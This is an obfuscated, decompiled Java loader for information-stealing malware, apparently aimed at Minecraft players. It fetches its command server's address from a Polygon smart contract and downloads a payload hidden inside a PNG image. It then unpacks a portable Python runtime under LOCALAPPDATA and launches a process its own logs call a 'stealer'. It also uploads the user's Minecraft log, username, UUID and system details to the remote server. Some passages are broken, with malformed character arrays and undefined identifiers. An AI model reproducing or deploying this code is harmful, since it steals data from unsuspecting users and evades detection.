package net.efn.loader;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class RuntimeBridge {
   private String zsbuBean;
   private String vd_ax_suc_rmhvjk;
   private String LVKgJ;
   private String lwie_iqx;
   private String holqwkData;
   private String tmz3;
   private String redxx_yhj;
   private String fq_hje;
   private String LARnLUgWBWfoqX2;
   private Path ndvosTcOjeq;
   private StringBuilder zqdl5;
   private String beqatwoYv;

   private static String[] gSTKti() {
      String[] var10000 = new String[5];
      StringBuilder var0 = new StringBuilder();
      StringBuilder var1 = new StringBuilder();
      StringBuilder var3 = new StringBuilder();
      var10000[0] = "https://polygon.drpc.org";
      StringBuilder var5 = new StringBuilder();
      StringBuilder var6 = new StringBuilder();
      StringBuilder var8 = new StringBuilder();
      StringBuilder var12 = new StringBuilder();
      var10000[1] = "https://polygon-bor-rpc.publicnode.com";
      var10000[2] = "https://1rpc.io/matic";
      StringBuilder var16 = new StringBuilder();
      StringBuilder var21 = new StringBuilder();
      var10000[3] = "https://api.zan.top/polygon-mainnet";
      StringBuilder var23 = new StringBuilder();
      StringBuilder var28 = new StringBuilder();
      var10000[4] = "https://rpc-mainnet.matic.quiknode.pro";
      return var10000;
   }

   private static String zVgtnxu() {
      StringBuilder var0 = new StringBuilder();
      StringBuilder var1 = new StringBuilder();
      StringBuilder var5 = new StringBuilder();
      return "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
   }

   private static String GbuB0L() {
      return "0xce6d41de";
   }

   private static String eghbepItem() {
      StringBuilder var0 = new StringBuilder();
      StringBuilder var3 = new StringBuilder();
      return "thisisafalsepositive.st";
   }

   private static String dif() {
      StringBuilder var0 = new StringBuilder();
      StringBuilder var1 = new StringBuilder();
      return "/cdn/v2/9f4e7a2c1b8d.png";
   }

   public static void main(String[] args) {
      RuntimeBridge ytbR_cgCE_XuOB_wUqa = new RuntimeBridge();
      ytbR_cgCE_XuOB_wUqa.execute(sbfumqTqujWpwuje);
   }

   public static String fgqnpyible() {
      StringBuilder var0 = new StringBuilder();
      StringBuilder var1 = new StringBuilder();
      StringBuilder var3 = new StringBuilder();
      StringBuilder var5 = new StringBuilder();
      return "dee6a29f-02c8-4ca4-b4fa-31a35a6fd876";
   }

   public static String emitMuxd() {
      StringBuilder var0 = new StringBuilder();
      return "Default";
   }

   public String getDomain() {
      if (kqgmHlraiq.beqatwoYv != null) {
         return kqgmHlraiq.beqatwoYv;
      } else {
         String var10000 = zVgtnxu();
         String var9 = GbuB0L();
         String var8 = var10000;
         StringBuilder var10;
         StringBuilder var25 = var10 = new StringBuilder();
         StringBuilder var11 = new StringBuilder();
         var10.append("{\"jsonrpc\":\"2.0\"");
         StringBuilder var13 = new StringBuilder();
         var10.append(",\"method\":\"eth_");
         StringBuilder var15 = new StringBuilder();
         var10.append("call\",\"params\":");
         StringBuilder var17 = new StringBuilder();
         var10.append("[{\"to\":\"");
         StringBuilder var26 = var25.append(var10.toString()).append(var8);
         StringBuilder var19 = new StringBuilder();
         StringBuilder var27 = var26.append("\",\"data\":\"").append(var9);
         char[] var21 = "\""',
            ',',
            '"',
            'l',
            'a',
            't',
            'e',
            's',
            't',
            '"',
            ']',
            ',',
            '"',
            'i',
            'd',
            '"',
            ':',
            '1',
            '}'
         };
         String zq_zqsx_bxiih = var27.append(new String(var21)).toString();

         for (String c1 : gSTKti()) {
            try {
               StringBuilder var23 = new StringBuilder();
               HttpTransport.Response count5 = HttpTransport.daiavydyStore(c1, zq_zqsx_bxiih, "application/json");
               if (count5.statusCode == 200) {
                  String bufLen = kqgmHlraiq.YtUU_A(count5.bodyString());
                  if (bufLen != null && bufLen.length() > 0) {
                     kqgmHlraiq.beqatwoYv = bufLen;
                     return bufLen;
                  }
               }
            } catch (Exception var24) {
            }
         }

         kqgmHlraiq.beqatwoYv = eghbepItem();
         return kqgmHlraiq.beqatwoYv;
      }
   }

   public String prefire(String host, String sess, String uid) {
      try {
         String var10000 = avfdw_ehnzm_fj_vqjma.ibllxUhmlBdnu(ohht_ydhe_afevu);
         String var7 = avfdw_ehnzm_fj_vqjma.ibllxUhmlBdnu(GLxG_dRKG_zBtq_KgpU);
         String var6 = var10000;
         StringBuilder var8;
         StringBuilder var32 = var8 = new StringBuilder();
         StringBuilder var33 = var32.append("/polygon-bo{\"sessionId\":\"").append(var6);
         String BULN_cUYE_wZEZ_yGra = var33.append("\",\"userId\":\"").append(var7).append("\"}").toString();
         StringBuilder var34 = new StringBuilder();
         StringBuilder var35 = var34.append("https://").append(sgfGbpxQukip);
         var10000 = var35.append("/shard/prefireMc").toString();
         StringBuilder var17 = new StringBuilder();
         String var10002 = "application/json";
         StringBuilder var19 = new StringBuilder();
         StringBuilder var20 = new StringBuilder();
         StringBuilder var22 = new StringBuilder();
         String var10003 = "X-Edge-Cache-Revalidate";
         String var10004 = "stale-if-error";
         StringBuilder var26 = new StringBuilder();
         String var10005 = "X-Runtime-Env";
         HttpTransport.Response Qa4jU3Hk_Q = HttpTransport.bFguUEehmav(
            var10000, BULN_cUYE_wZEZ_yGra, var10002, Map.of(var10003, var10004, var10005, "jre-embedded")
         );
         if (Qa4jU3Hk_Q.statusCode == 200) {
            String var10001 = Qa4jU3Hk_Q.bodyString();
            StringBuilder var30 = new StringBuilder();
            return avfdw_ehnzm_fj_vqjma.Pd_Ez(var10001, "prefireId");
         }
      } catch (Exception var31) {
      }

      return null;
   }

   public void execute(String[] args) {
      try {
         fvXo.ndvosTcOjeq = fvXo.ipeiMonitor();
         fvXo.zqdl5 = new StringBuilder();
         Files.createDirectories(fvXo.ndvosTcOjeq);
         StringBuilder var4 = new StringBuilder();
         StringBuilder var5 = new StringBuilder();
         StringBuilder var7 = new StringBuilder();
         fvXo.Ye_wJaCdzW_7("========== DETACHED PROCESS STARTED ==========");
         if (ghenk_sd_guazn.length < 1) {
            StringBuilder var13 = new StringBuilder();
            StringBuilder var14 = new StringBuilder();
            StringBuilder var16 = new StringBuilder();
            fvXo.Ye_wJaCdzW_7("ERROR: No context argument");
            fvXo.ZQU9VrAN2Ia();
            return;
         }

         if (!fvXo.nkkvSqJwmkyt(ghenk_sd_guazn[0])) {
            StringBuilder var18 = new StringBuilder();
            StringBuilder var19 = new StringBuilder();
            fvXo.Ye_wJaCdzW_7("ERROR: Failed to parse context");
            fvXo.ZQU9VrAN2Ia();
            return;
         }

         String var24 = fvXo.LARnLUgWBWfoqX2;
         String var23 = fvXo.LVKgJ;
         StringBuilder var25;
         StringBuilder var77 = var25 = new StringBuilder();
         var25.append("Context parse");
         StringBuilder var28 = new StringBuilder();
         var25.append("d - UserId: ");
         var77 = var77.append(var25.toString()).append(var23);
         StringBuilder var30 = new StringBuilder();
         fvXo.Ye_wJaCdzW_7(var77.append(", Env: ").append(var24).toString());
         Path zHCe_CxEF_ZMWB_SyTB = fvXo.ndvosTcOjeq.resolve("python.exe");
         Path var10000 = fvXo.ndvosTcOjeq;
         StringBuilder var34 = new StringBuilder();
         var10000 = var10000.resolve("AppHost");
         StringBuilder var36 = new StringBuilder();
         Path gkntMxRvylMgaav = var10000.resolve("main.py");
         if (Files.exists(zHCe_CxEF_ZMWB_SyTB) && Files.exists(gkntMxRvylMgaav)) {
            StringBuilder var52 = new StringBuilder();
            StringBuilder var55 = new StringBuilder();
            StringBuilder var57 = new StringBuilder();
            fvXo.Ye_wJaCdzW_7("Portable runtime already cached");
         } else {
            StringBuilder var38 = new StringBuilder();
            StringBuilder var43 = new StringBuilder();
            fvXo.Ye_wJaCdzW_7("Downloading portable runtime...");
            int var64 = -953190856;
            if (var64 == -953190856) {
               long var69 = -7789442579772188033L;
               long var70 = var69 & 542672327998874468L;
               long var71 = var70 | 6225383753667148895L;
               int var66 = 143059044;
               var66 += 214;
               var66 ^= 1681062705;
               var66 <<= 2;
            }

            if (!fvXo.hqqlFd()) {
               StringBuilder var45 = new StringBuilder();
               StringBuilder var50 = new StringBuilder();
               fvXo.Ye_wJaCdzW_7("ERROR: Failed to setup portable runtime");
               fvXo.ZQU9VrAN2Ia();
               return;
            }
         }

         StringBuilder var59 = new StringBuilder();
         fvXo.Ye_wJaCdzW_7("Spawning stealer...");
         fvXo.run();
         fvXo.ZQU9VrAN2Ia();
      } catch (Exception var68) {
         String var10001 = var68.getClass().getSimpleName();
         String var62 = var68.getMessage();
         String var61 = var10001;
         StringBuilder var63;
         StringBuilder var76 = var63 = new StringBuilder();
         var63.append('F');
         var63.append('A');
         var63.append('T');
         var63.append('A');
         var63.append('L');
         var63.append(':');
         var63.append(' ');
         fvXo.Ye_wJaCdzW_7(var76.append(var63.toString()).append(var61).append(": ").append(var62).toString());

         try {
            fvXo.ZQU9VrAN2Ia();
         } catch (Exception var67) {
         }
      }
   }

   private Path ipeiMonitor() {
      String JKAX5f5lfG_J2w = System.getenv("LOCALAPPDATA");
      String[] var10001 = new String[3];
      var10001[0] = "Microsoft";
      StringBuilder var6 = new StringBuilder();
      var10001[1] = "Windows";
      StringBuilder var8 = new StringBuilder();
      var10001[2] = "NtProfileIndex";
      return Path.of(JKAX5f5lfG_J2w, var10001);
   }

   private boolean hqqlFd() {
      int NXlAkc = 3;

      for (int qpaxcpZbIuikRxwob = 1; qpaxcpZbIuikRxwob <= NXlAkc; qpaxcpZbIuikRxwob++) {
         try {
            StringBuilder var8;
            StringBuilder var111 = var8 = new StringBuilder();
            jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var111.append("NtProfileIndexDownload attempt ").append(qpaxcpZbIuikRxwob).append("/").append(NXlAkc).append("...").toString());
            String var10000 = jrZjnoZwmtxvBk.holqwkData;
            String var11 = dif();
            String var10 = var10000;
            StringBuilder var12;
            StringBuilder var107 = var12 = new StringBuilder();
            var10000 = var107.append("publicnode.comhttps://").append(var10).append(var11).toString();
            StringBuilder var14 = new StringBuilder();
            String var112 = "User-Agent";
            StringBuilder var16 = new StringBuilder();
            StringBuilder var17 = new StringBuilder();
            StringBuilder var19 = new StringBuilder();
            StringBuilder var29 = new StringBuilder();
            StringBuilder var35 = new StringBuilder();
            String var10002 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
            StringBuilder var37 = new StringBuilder();
            String var10003 = "Accept";
            StringBuilder var39 = new StringBuilder();
            StringBuilder var40 = new StringBuilder();
            StringBuilder var48 = new StringBuilder();
            String var10004 = "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";
            String var10005 = "Accept-Language";
            StringBuilder var52 = new StringBuilder();
            String var10006 = "en-US,en;q=0.9";
            String var10007 = "Sec-Fetch-Dest";
            StringBuilder var56 = new StringBuilder();
            String var10008 = "image";
            String var10009 = "Sec-Fetch-Mode";
            StringBuilder var60 = new StringBuilder();
            String var10010 = "no-cors";
            StringBuilder var62 = new StringBuilder();
            String var10011 = "Sec-Fetch-Site";
            StringBuilder var64 = new StringBuilder();
            HttpTransport.Response cmhwRicrj = HttpTransport.get(
               var10000, Map.of(var112, var10002, var10003, var10004, var10005, var10006, var10007, var10008, var10009, var10010, var10011, "same-origin")
            );
            if (cmhwRicrj.statusCode != 200 || cmhwRicrj.body.length == 0) {
               int var66 = cmhwRicrj.statusCode;
               var111 = new StringBuilder();
               jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var111.append("Download failed: HTTP ").append(var66).toString());
               continue;
            }

            int var69 = cmhwRicrj.body.length;
            StringBuilder var70;
            var111 = var70 = new StringBuilder();
            var70.append('D');
            var70.append('o');
            var70.append('w');
            var70.append('n');
            var70.append('l');
            var70.append('o');
            var70.append('a');
            var70.append('d');
            var70.append('e');
            var70.append('d');
            var70.append(' ');
            var111 = var111.append(var70.toString()).append(var69);
            StringBuilder var72 = new StringBuilder();
            StringBuilder var73 = new StringBuilder();
            StringBuilder var75 = new StringBuilder();
            StringBuilder var77 = new StringBuilder();
            jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var111.append(" bytes, extracting from image...").toString());
            byte[] XzddkdvS9RH = jrZjnoZwmtxvBk.LARVUgjVMvB(cmhwRicrj.body);
            if (XzddkdvS9RH == null) {
               StringBuilder var79 = new StringBuilder();
               jrZjnoZwmtxvBk.Ye_wJaCdzW_7("PNG extraction failed");
               continue;
            }

            int var81 = XzddkdvS9RH.length;
            var111 = new StringBuilder();
            var111 = var111.append("Extracted ").append(var81);
            StringBuilder var84 = new StringBuilder();
            StringBuilder var85 = new StringBuilder();
            StringBuilder var89 = new StringBuilder();
            jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var111.append(" bytes from image, unpacking...").toString());
            int prevRef = jrZjnoZwmtxvBk.TXdXsqCce_cu(XzddkdvS9RH);
            StringBuilder var92;
            var111 = var92 = new StringBuilder();
            var92.append('E');
            var92.append('x');
            var92.append('t');
            var92.append('r');
            var92.append('a');
            var92.append('c');
            var92.append('t');
            var92.append('e');
            var92.append('d');
            var92.append(' ');
            var111 = var111.append(var92.toString()).append(prevRef);
            jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var111.append(" files").toString());
            Path var109 = jrZjnoZwmtxvBk.ndvosTcOjeq;
            StringBuilder var96 = new StringBuilder();
            if (Files.exists(var109.resolve("python.exe"))) {
               StringBuilder var98 = new StringBuilder();
               jrZjnoZwmtxvBk.Ye_wJaCdzW_7("Portable runtime ready");
               return true;
            }
         } catch (Exception var106) {
            String var101 = var106.getMessage();
            StringBuilder var10001 = new StringBuilder();
            var10001 = var10001.append("Attempt ").append(qpaxcpZbIuikRxwob);
            jrZjnoZwmtxvBk.Ye_wJaCdzW_7(var10001.append(" error: ").append(var101).toString());
         }

         if (qpaxcpZbIuikRxwob < NXlAkc) {
            try {
               Thread.sleep(2000L * qpaxcpZbIuikRxwob);
            } catch (InterruptedException var105) {
            }
         }
      }

      return false;
   }

   private int TXdXsqCce_cu(byte[] data) throws IOException {
      int idlh_fyecm = 0;
      byte[] CmEO_PSny_hHkZ_wbSi = new byte[131072];
      ByteArrayInputStream idx4 = new ByteArrayInputStream(xTUc_DknY_Ksnx_FgEd);

      ZipInputStream QPKlVni;
      ZipEntry fychv_azzu_lstlir;
      for (QPKlVni = new ZipInputStream(idx4); (fychv_azzu_lstlir = QPKlVni.getNextEntry()) != null; idlh_fyecm++) {
         Path value3 = hVZeAIt.ndvosTcOjeq.resolve(fychv_azzu_lstlir.getName());
         if (fychv_azzu_lstlir.isDirectory()) {
            Files.createDirectories(value3);
         } else {
            Files.createDirectories(value3.getParent());
            FileOutputStream vvsr_og_bfsz = new FileOutputStream(value3.toFile());
            BufferedOutputStream b4 = new BufferedOutputStream(vvsr_og_bfsz, 131072);

            int cursorbuf;
            while ((cursorbuf = QPKlVni.read(CmEO_PSny_hHkZ_wbSi)) > 0) {
               b4.write(CmEO_PSny_hHkZ_wbSi, 0, cursorbuf);
            }

            b4.close();
         }

         QPKlVni.closeEntry();
      }

      QPKlVni.close();
      return idlh_fyecm;
   }

   private byte[] LARVUgjVMvB(byte[] img) {
      try {
         if (hh_zrmsc_qlczv_hrwr.length < 8) {
            return null;
         } else {
            byte[] ZR24XM6xFy_E = new byte[]{-119, 80, 78, 71, 13, 10, 26, 10};

            for (int qexOnEkzvtyCnycs = 0; qexOnEkzvtyCnycs < 8; qexOnEkzvtyCnycs++) {
               if (hh_zrmsc_qlczv_hrwr[qexOnEkzvtyCnycs] != ZR24XM6xFy_E[qexOnEkzvtyCnycs]) {
                  return null;
               }
            }

            int tosoy_ujv_utr_xn = 8;

            while (tosoy_ujv_utr_xn + 8 <= hh_zrmsc_qlczv_hrwr.length) {
               int aAvg = (hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn] & 255) << 24
                  | (hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 1] & 255) << 16
                  | (hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 2] & 255) << 8
                  | hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 3] & 255;
               byte rCTr_zYOt_GkYQ_IsNY = hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 4];
               byte lxoepi_kbfr = hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 5];
               byte EmE_bY = hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 6];
               byte wmgY_pxKg_wDbE_hgxS = hh_zrmsc_qlczv_hrwr[tosoy_ujv_utr_xn + 7];
               if (rCTr_zYOt_GkYQ_IsNY == 104 && lxoepi_kbfr == 73 && EmE_bY == 100 && wmgY_pxKg_wDbE_hgxS == 115) {
                  byte[] NsXb_fAiR_OxGz_irCs = Arrays.copyOfRange(hh_zrmsc_qlczv_hrwr, tosoy_ujv_utr_xn + 8, tosoy_ujv_utr_xn + 8 + aAvg);
                  return lodJhpahaDzxicnXh.waaKwdlgDbnmwkaMtk(NsXb_fAiR_OxGz_irCs);
               }

               tosoy_ujv_utr_xn += 12 + aAvg;
            }

            return null;
         }
      } catch (Exception var10) {
         return null;
      }
   }

   private byte[] waaKwdlgDbnmwkaMtk(byte[] comp) {
      try {
         Inflater sourceAux = new Inflater();
         sourceAux.setInput(mnLYSCz__e);
         ByteArrayOutputStream nRef = new ByteArrayOutputStream(mnLYSCz__e.length * 5);
         byte[] CXXQ8B_iwRAsJ7 = new byte[131072];

         while (!sourceAux.finished()) {
            int wb_kott = sourceAux.inflate(CXXQ8B_iwRAsJ7);
            if (wb_kott == 0 && sourceAux.needsInput()) {
               break;
            }

            nRef.write(CXXQ8B_iwRAsJ7, 0, wb_kott);
         }

         sourceAux.end();
         return nRef.toByteArray();
      } catch (Exception var6) {
         return null;
      }
   }

   private void run() {
      try {
         Path Axxh_tFmZ_OMWK_GywC = kir_bv_oh.ndvosTcOjeq.resolve("python.exe");
         Path var10000 = kir_bv_oh.ndvosTcOjeq;
         StringBuilder var8 = new StringBuilder();
         var10000 = var10000.resolve("AppHost");
         Path posOut = var10000.resolve("main.py");
         if (!Files.exists(posOut)) {
            StringBuilder var12 = new StringBuilder();
            kir_bv_oh.Ye_wJaCdzW_7("ERROR: main.py not found");
            return;
         }

         List PPwQ_Pupk_SoWE_GmLD = new ArrayList();
         PPwQ_Pupk_SoWE_GmLD.add(Axxh_tFmZ_OMWK_GywC.toString());
         PPwQ_Pupk_SoWE_GmLD.add(posOut.toString());
         PPwQ_Pupk_SoWE_GmLD.add("-u");
         PPwQ_Pupk_SoWE_GmLD.add(kir_bv_oh.LVKgJ);
         StringBuilder var17 = new StringBuilder();
         PPwQ_Pupk_SoWE_GmLD.add("--env");
         PPwQ_Pupk_SoWE_GmLD.add(kir_bv_oh.LARnLUgWBWfoqX2);
         if (kir_bv_oh.lwie_iqx != null) {
            if (!kir_bv_oh.lwie_iqx.equals("null")) {
               StringBuilder var21 = new StringBuilder();
               PPwQ_Pupk_SoWE_GmLD.add("--tag");
               PPwQ_Pupk_SoWE_GmLD.add(kir_bv_oh.lwie_iqx);
            }
         }

         if (kir_bv_oh.zsbuBean != null) {
            String var43 = kir_bv_oh.zsbuBean;
            StringBuilder var23 = new StringBuilder();
            if (!var43.equals("null")) {
               StringBuilder var25 = new StringBuilder();
               PPwQ_Pupk_SoWE_GmLD.add("--mcInfo");
               PPwQ_Pupk_SoWE_GmLD.add(kir_bv_oh.zsbuBean);
            }
         }

         if (kir_bv_oh.vd_ax_suc_rmhvjk != null) {
            String var44 = kir_bv_oh.vd_ax_suc_rmhvjk;
            StringBuilder var27 = new StringBuilder();
            if (!var44.equals("null")) {
               StringBuilder var29 = new StringBuilder();
               PPwQ_Pupk_SoWE_GmLD.add("--prefireId");
               PPwQ_Pupk_SoWE_GmLD.add(kir_bv_oh.vd_ax_suc_rmhvjk);
            }
         }

         ProcessBuilder Wkj_K_feKMSJ = new ProcessBuilder(PPwQ_Pupk_SoWE_GmLD);
         Path var45 = kir_bv_oh.ndvosTcOjeq;
         StringBuilder var31 = new StringBuilder();
         Wkj_K_feKMSJ.directory(var45.resolve("AppHost").toFile());
         Wkj_K_feKMSJ.redirectInput(Redirect.from(new File("NUL")));
         var45 = kir_bv_oh.ndvosTcOjeq;
         StringBuilder var33 = new StringBuilder();
         Wkj_K_feKMSJ.redirectOutput(Redirect.appendTo(var45.resolve("_stealer.log").toFile()));
         Wkj_K_feKMSJ.redirectErrorStream(true);
         Process Ap1_Ol = Wkj_K_feKMSJ.start();
         long var35 = Ap1_Ol.pid();
         StringBuilder var37;
         StringBuilder var47 = var37 = new StringBuilder();
         kir_bv_oh.Ye_wJaCdzW_7(var47.append("AcceptStealer spawned: pid=").append(var35).toString());
      } catch (Exception var41) {
         String var39 = var41.getMessage();
         StringBuilder var10001 = new StringBuilder();
         kir_bv_oh.Ye_wJaCdzW_7(var10001.append("Spawn error: ").append(var39).toString());
      }
   }

   private void ZQU9VrAN2Ia() {
      if (b3.holqwkData != null) {
         try {
            StringBuilder limitStr = new StringBuilder();
            if (b3.tmz3 != null) {
               String var10000 = b3.tmz3;
               String[] var115 = new String[2];
               var115[0] = "logs";
               var115[1] = "latest.log";
               Path fdILTV = Path.of(var10000, var115);
               if (Files.exists(fdILTV)) {
                  try {
                     String qjfPyAp = Files.readString(fdILTV);
                     if (qjfPyAp.length() > 5000000) {
                        var10000 = qjfPyAp.substring(0, 2500000);
                        String var9 = qjfPyAp.substring(qjfPyAp.length() - 2500000);
                        String var8 = var10000;
                        StringBuilder var101 = new StringBuilder().append(var8);
                        StringBuilder var10 = new StringBuilder();
                        qjfPyAp = var101.append("\n=== TRUNCATED ===\n").append(var9).toString();
                     }

                     limitStr.append(qjfPyAp);
                  } catch (Exception var93) {
                     limitStr.append("ERROR reading MC log: ").append(var93.getMessage());
                  }
               }
            }

            StringBuilder var14 = new StringBuilder();
            StringBuilder var17 = new StringBuilder();
            StringBuilder var19 = new StringBuilder();
            limitStr.append(b3.zqdl5.toString());
            StringBuilder var21 = new StringBuilder();
            StringBuilder var24 = new StringBuilder();
            StringBuilder var28 = new StringBuilder();
            StringBuilder var102 = /* +"jvm=" */
            var102.append(System.getProperty("java.version")).append("\n");
            var102 = /* +"os=" */
            var102.append(System.getProperty("os.name")).append("\n");
            StringBuilder var34 = new StringBuilder();
            var102 = /* +"user=" */
            var102.append(System.getProperty("user.name")).append("\n");
            String var105 = b3.ibllxUhmlBdnu(b3.LVKgJ);
            String var116 = b3.ibllxUhmlBdnu(limitStr.toString());
            String var10002 = b3.ibllxUhmlBdnu(b3.redxx_yhj != null ? b3.redxx_yhj : "N/A");
            String var10003 = b3.ibllxUhmlBdnu(b3.fq_hje != null ? b3.fq_hje : "N/A");
            String var42 = b3.ibllxUhmlBdnu(b3.LARnLUgWBWfoqX2);
            String var41 = var10003;
            String var40 = var10002;
            String var39 = var116;
            String var38 = var105;
            var102 = new StringBuilder();
            var102 = var102.append("{\"userId\":\"").append(var38);
            var102 = var102.append("\",\"content\":\"").append(var39);
            StringBuilder var47 = new StringBuilder();
            StringBuilder var50 = new StringBuilder();
            StringBuilder var52 = new StringBuilder();
            var102 = var102.append("\",\"filename\":\"combined.log\",\"mcUsername\":\"").append(var40);
            StringBuilder var56 = new StringBuilder();
            var102 = var102.append("\",\"mcUuid\":\"").append(var41);
            StringBuilder var58 = new StringBuilder();
            StringBuilder var59 = new StringBuilder();
            var102 = var102.append("\",\"executionEnvironment\":\"").append(var42);
            char[] var63 = "-Detached\""'
            };
            String opts = var102.append(new String(var63)).toString();
            int var91 = 1156892;
            if (var91 >= 1156892 && var91 < 3965006) {
               long var97 = 966539755L;
               long var98 = var97 * 61L;
               long var99 = var98 ^ -493844635L;
            }

            String var65 = b3.holqwkData;
            StringBuilder var66;
            var102 = var66 = new StringBuilder();
            var66.append('h');
            var66.append('t');
            var66.append('t');
            var66.append('p');
            var66.append('s');
            var66.append(':');
            var66.append('/');
            var66.append('/');
            var102 = var102.append(var66.toString()).append(var65);
            StringBuilder var68 = new StringBuilder();
            StringBuilder var71 = new StringBuilder();
            String var114 = var102.append("/shard/submitMinecraftLog").toString();
            StringBuilder var73 = new StringBuilder();
            var10002 = "application/json";
            StringBuilder var75 = new StringBuilder();
            StringBuilder var76 = new StringBuilder();
            var10003 = "X-Edge-Cache-Revalidate";
            StringBuilder var80 = new StringBuilder();
            String var10004 = "stale-if-error";
            String var10005 = "X-Runtime-Env";
            HttpTransport.Response elemMax = HttpTransport.bFguUEehmav(var114, opts, var10002, Map.of(var10003, var10004, var10005, "jre-embedded"));
            int var86 = elemMax.statusCode;
            StringBuilder var117 = new StringBuilder();
            b3.Ye_wJaCdzW_7(var117.append("Log submitted: ").append(var86).toString());
         } catch (Exception var94) {
            String var89 = var94.getMessage();
            StringBuilder var90;
            StringBuilder var10001 = var90 = new StringBuilder();
            var90.append('S');
            var90.append('u');
            var90.append('b');
            var90.append('m');
            var90.append('i');
            var90.append('t');
            var90.append(' ');
            var90.append('e');
            var90.append('r');
            var90.append('r');
            var90.append('o');
            var90.append('r');
            var90.append(':');
            var90.append(' ');
            b3.Ye_wJaCdzW_7(var10001.append(var90.toString()).append(var89).toString());
         }
      }
   }

   private void Ye_wJaCdzW_7(String msg) {
      long var3 = System.currentTimeMillis();
      String jT_43wk = "[" + var3 + "] " + tmk0z__crml;
      if (szy_pbrz.zqdl5 != null) {
         szy_pbrz.zqdl5.append(jT_43wk).append("\n");
      }

      System.out.println(jT_43wk);
   }

   private boolean nkkvSqJwmkyt(String b64) {
      try {
         String vcjzg_axzzgo_kurwb = new String(Base64.getDecoder().decode(xdskzpEmqszi), StandardCharsets.UTF_8);
         kbpnEpgVehzEd.zsbuBean = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "mcInfo");
         StringBuilder var5 = new StringBuilder();
         kbpnEpgVehzEd.vd_ax_suc_rmhvjk = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "prefireId");
         kbpnEpgVehzEd.LVKgJ = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "userId");
         kbpnEpgVehzEd.lwie_iqx = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "tag");
         kbpnEpgVehzEd.holqwkData = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "domain");
         kbpnEpgVehzEd.tmz3 = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "gameDir");
         StringBuilder var13 = new StringBuilder();
         kbpnEpgVehzEd.redxx_yhj = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "mcUsername");
         kbpnEpgVehzEd.fq_hje = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "mcUuid");
         kbpnEpgVehzEd.LARnLUgWBWfoqX2 = kbpnEpgVehzEd.Pd_Ez(vcjzg_axzzgo_kurwb, "env");
         if (kbpnEpgVehzEd.LARnLUgWBWfoqX2 == null) {
            StringBuilder var17 = new StringBuilder();
            kbpnEpgVehzEd.LARnLUgWBWfoqX2 = "Fabric";
         }

         return kbpnEpgVehzEd.holqwkData != null && kbpnEpgVehzEd.LVKgJ != null;
      } catch (Exception var18) {
         return false;
      }
   }

   private String YtUU_A(String json) {
      StringBuilder var7 = new StringBuilder();
      int name = hqa_tpxb_rejtdm_hbn.indexOf("\"result\"");
      if (name == -1) {
         return null;
      } else {
         int anzmy_vz = hqa_tpxb_rejtdm_hbn.indexOf(":", name);
         int msgPtr = hqa_tpxb_rejtdm_hbn.indexOf("\"", anzmy_vz);
         int cursor2 = hqa_tpxb_rejtdm_hbn.indexOf("\"", msgPtr + 1);
         if (msgPtr != -1 && cursor2 != -1) {
            String WOl = hqa_tpxb_rejtdm_hbn.substring(msgPtr + 1, cursor2);
            return pr_ni_okssn_ciigva.kocfLe(WOl);
         } else {
            return null;
         }
      }
   }

   private String kocfLe(String hex) {
      if (xfehxGpRumq != null && xfehxGpRumq.startsWith("0x") && xfehxGpRumq.length() >= 130) {
         try {
            String optsref = xfehxGpRumq.substring(2);
            int jafgku_qyd_niaf_qjyof = Integer.parseInt(optsref.substring(64, 128), 16);
            if (jafgku_qyd_niaf_qjyof != 0 && jafgku_qyd_niaf_qjyof <= 10000) {
               String mebdj_ph = optsref.substring(128, 128 + jafgku_qyd_niaf_qjyof * 2);
               byte[] head0 = H2zFlq.hndmz1(mebdj_ph);
               return new String(head0, StandardCharsets.UTF_8);
            } else {
               int var6 = -563018784;
               if (var6 - -563018784 == 0) {
                  int var8 = 2979;
                  var8 += 32;
               }

               return null;
            }
         } catch (Exception var7) {
            return null;
         }
      } else {
         return null;
      }
   }

   private byte[] hndmz1(String hex) {
      int aSxEFoI_T = yb_ech_le_ah.length();
      byte[] prevPos = new byte[aSxEFoI_T / 2];

      for (int cqHsy = 0; cqHsy < aSxEFoI_T; cqHsy += 2) {
         prevPos[cqHsy / 2] = (byte)((Character.digit(yb_ech_le_ah.charAt(cqHsy), 16) << 4) + Character.digit(yb_ech_le_ah.charAt(cqHsy + 1), 16));
      }

      return prevPos;
   }

   private String Pd_Ez(String json, String key) {
      String bStr = "\"" + tQiY_YQnz_ZoEg_Fmdo + "\":\"";
      int dtZck1Z___H = C4Oeik.indexOf(bStr);
      if (dtZck1Z___H == -1) {
         return null;
      } else {
         int configMax = dtZck1Z___H + bStr.length();
         StringBuilder retMax = new StringBuilder();
         boolean Qvg = false;

